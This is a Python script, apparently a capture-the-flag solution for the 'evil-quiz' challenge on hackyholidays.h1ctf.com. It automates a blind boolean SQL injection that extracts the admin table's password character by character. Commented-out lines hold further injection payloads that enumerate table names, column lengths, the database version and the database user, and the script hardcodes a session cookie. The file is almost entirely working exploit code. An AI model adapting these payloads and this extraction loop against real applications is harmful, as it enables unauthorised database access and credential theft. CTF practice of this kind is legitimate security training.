import requests
import string




ch=string.printable

#table ->admin
#username -->column length 5   
#password ---> length 17    

session = requests.Session()


#1' or (select length(column_name) from information_schema.columns  where table_name='admin'  limit 1,1) >= 4 -- -

#admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) >=97 -- -

#admin' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1) >=100 -- -

#payload="admin'  and ascii(substring('ABC',1,1))=65 -- - "
p=""

for i in range(1,18):
    for c in ch:

        #payload="admin'  and length(version())={}  -- -".format(str(i))
        #payload="admin' and ascii(substring(table_name,{},1) from information_schema.tables where table_schema='quiz' LIMIT 0,1)>={} -- -".format(str(i),ord(c))
        #payload="admin'  and ascii(substring(user(),{},1))={} -- - ".format(str(i),ord(c))
        payload="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(i),ord(c))
        paramsPost = {"name":str(payload)}
        headers = {"Origin":"https://hackyholidays.h1ctf.com","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Connection":"close","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36","Referer":"https://hackyholidays.h1ctf.com/evil-quiz","Sec-Fetch-Site":"same-origin","Sec-Fetch-Dest":"document","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"navigate","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.9","Content-Type":"application/x-www-form-urlencoded"}
        cookies = {"session":"381897af73d6fd8853365a2209eb6bca"}
        response = session.post("https://hackyholidays.h1ctf.com/evil-quiz", data=paramsPost, headers=headers, cookies=cookies)
        response3 = session.get("https://hackyholidays.h1ctf.com/evil-quiz/score", headers=headers, cookies=cookies)
        #print(response3.text.index(">There is"))

        #print(response3.text.index("other player(s) with the same name as"))

        #print(response3.text[1440:1457])
        print(c)
        if  'There is 0 other player(s) ' not  in   response3.text:
            print('[+] {}'.format(str(c)))
            p+=str(c)
            print(p)
            break

print('[+]'.format(str(p)))
